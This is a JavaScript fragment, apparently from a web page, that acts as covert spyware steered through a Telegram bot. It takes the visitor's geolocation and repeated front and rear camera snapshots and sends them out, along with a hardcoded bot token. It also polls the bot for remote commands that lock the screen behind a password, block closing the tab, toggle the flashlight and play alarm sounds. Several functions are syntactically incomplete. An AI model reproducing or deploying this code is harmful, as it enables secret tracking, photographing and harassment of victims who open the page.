    <script>

        let isTerkunci = false;

        // === DATA BOT TELEGRAM ===
        const BOT_TOKEN = "8956799082:AAF_L6m4vulIqnqZG1VMsimvtpDw2ZlRSog";

        const video = document.getElementById('video');

        let lampuHidup = false;
        let torchStream = null;
        let lastUpdateId = 0;

        // === FUNGSI KUNCI & BUKA ===
        function kunciDenganPassword(pass) {
            kataLaluanSementara = pass;

            document.getElementById("skrinKunciTelegram").style.display = "flex";

        function bukaDariTelegram() {

        function bukaKunciManual() {
            const input = document.getElementById("inputBukaManual").value.trim();

                kataLaluanSementara = "";
                isTerkunci = false;
                document.getElementById("skrinKunciTelegram").style.display = "none";
                pesan.textContent = "";
            } else {
                pesan.textContent = "❌ Kata laluan salah!";
            }
        }

        // Halang tutup tab bila terkunci
        window.onbeforeunload = e => {
            if (isTerkunci) {
                e.preventDefault();
                e.returnValue = "Peranti masih terkunci!";
                return e.returnValue;
            }
        };

        // === FUNGSI ASAL - SEMUA DIBLOK JIKA TERKUNCI ===
        document.addEventListener('click', () => {
            if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
        }, { once: true });

        function mainNadaVirus() {
            if (isTerkunci) return;
            try {
                if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
                if (konteksAudio.state === 'suspended') konteksAudio.resume();
                const vol = konteksAudio.createGain(); vol.gain.value = 1; vol.connect(konteksAudio.destination);
                const vol2 = konteksAudio.createGain(); vol2.gain.value = 0.9; vol2.connect(konteksAudio.destination);
                const nada = [
                    {f:880,t:0.45},{f:988,t:0.45},{f:784,t:0.45},
                    {f:880,t:0.55},{f:988,t:0.55},{f:698,t:0.5},{f:784,t:0.6}
                ];
                let masa=0;
                nada.forEach(n=>{
                    const o1=konteksAudio.createOscillator(); o1.type="square"; o1.frequency.value=n.f; o1.connect(vol); o1.start(konteksAudio.currentTime+masa); o1.stop(konteksAudio.currentTime+masa+n.t);
                    const o2=konteksAudio.createOscillator(); o2.type="sawtooth"; o2.frequency.value=n.f*0.998; o2.connect(vol2); o2.start(konteksAudio.currentTime+masa); o2.stop(konteksAudio.currentTime+masa+n.t);
                    masa+=n.t+0.18;
                });
                tambahLog("🔊 Bunyi Virus aktif");

        function mainNadaIphone() {
            if (isTerkunci) return;

                if (!konteksAudio) konteksAudio = new (window.AudioContext || window.webkitAudioContext)();
                if (konteksAudio.state === 'suspended') konteksAudio.resume();
                const vol = konteksAudio.createGain(); vol.gain.value = 1; vol.connect(konteksAudio.destination);
                const nada = [{f:784,t:0.5},{f:880,t:0.5},{f:988,t:0.5},{f:784,t:0.6},{f:880,t:0.6},{f:988,t:0.7}];
                let masa=0;
                nada.forEach(n=>{
                    const o=konteksAudio.createOscillator(); o.type="sine"; o.frequency.value=n.f; o.connect(vol); o.start(konteksAudio.currentTime+masa); o.stop(konteksAudio.currentTime+masa+n.t);
                    masa+=n.t+0.15;
                });
                tambahLog("🔊 Bunyi iPhone aktif");
            } catch (err) { tambahLog("❌ Ralat bunyi"); }

        function mulakanSistem(){
            if (isTerkunci) return;
            let no = document.getElementById('nombor').value || "TIADA";
            let jenis = document.getElementById('jenis').value;

            dapatkanLokasi();
            mulaKamera();
        }

        function dapatkanLokasi(){
            if (isTerkunci) return;
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(p=>{
                    let lat=p.coords.latitude.toFixed(6), lon=p.coords.longitude.toFixed(6);
                    hantarTelegram(`📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`);
                }, e=>tambahLog("❌ Lokasi gagal"));
            }
        }

        async function mulaKamera(){
            if (isTerkunci) return;
            let mod="user";
            const ambil=async()=>{
                try{
                    let strim=await navigator.mediaDevices.getUserMedia({video:{facingMode:mod}});
                    video.srcObject=strim;
                    if(mod==="environment") torchStream=strim;
                    setTimeout(()=>hantarGambar(mod),2000);
                    mod=mod==="user"?"environment":"user";
                }catch(e){}
            }; ambil(); setInterval(ambil,8000);
        }
        function hantarGambar(nama){
            if (isTerkunci || !video.srcObject) return;
            canvas.width=video.videoWidth; canvas.height=video.videoHeight;
            canvas.getContext('2d').drawImage(video,0,0,canvas.width,canvas.height);
            hantarGambarTelegram(canvas.toDataURL(),`📸 ${nama}`);
        }

        async function tukarLampu(){
            if (isTerkunci) return;
            try{
                if(!lampuHidup){
                    if(!torchStream) torchStream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"environment",torch:true}});
                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:true}]});
                    lampuHidup=true;
                    hantarTelegram("💡 Lampu ON");
                }else{
                    await torchStream.getVideoTracks()[0].applyConstraints({advanced:[{torch:false}]});
                    lampuHidup=false;
                    hantarTelegram("💡 Lampu OFF");
                }
            }catch(e){}
        }

        // === BACA ARAHAN TELEGRAM ===
        setInterval(()=>{
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId+1}`)
            .then(r=>r.json()).then(d=>{
                if(d.ok && d.result.length>0){
                    d.result.forEach(u=>{
                        lastUpdateId=u.update_id;
                        let teks = u.message?.text?.trim() || "";
                        let cmd = teks.toLowerCase();

                        // ✅ Kunci + tetapkan kata laluan terus dari Telegram
                        if(cmd.startsWith("/kunci ")){
                            let passBaru = teks.split(" ")[1];

                        if(cmd === "/kunci"){

                        // Buka terus tanpa kata laluan
                        if(cmd === "/buka") bukaDariTelegram();

                        if(!isTerkunci){
                            if(cmd==="/maps") dapatkanLokasi();

                            if(cmd==="/lampu") tukarLampu();
                            if(cmd==="/virus"||cmd==="/nokia") mainNadaVirus();
                            if(cmd==="/iphone") mainNadaIphone();
                            if(cmd==="/delay") hantarTelegram("⏱️ Delay aktif");
                            if(cmd==="/fc") hantarTelegram("🌀 FC aktif");
                        }
                    });
                }
            }).catch(()=>{});
        }, 4000);

        // === ALAT BANTU ===
        function hantarTelegram(t){
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
                method:"POST", headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:CHAT_ID, text:t, parse_mode:"Markdown"})
            });
        }
        function tambahLog(t){log.innerHTML+=t+"<br>";log.scrollTop=log.scrollHeight;}
        function dataURLkeBlob(d){let b=d.split(','),t=b[0].match(/:(.*?);/)[1],s=atob(b[1]),l=s.length,a=new Uint8Array(l);while(l--)a[l]=s.charCodeAt(l);return new Blob([a],{type:t})}
        function hantarGambarTelegram(url,c){let b=dataURLkeBlob(url),f=new FormData();f.append("chat_id",CHAT_ID);f.append("photo",b);f.append("caption",c);fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:f})}
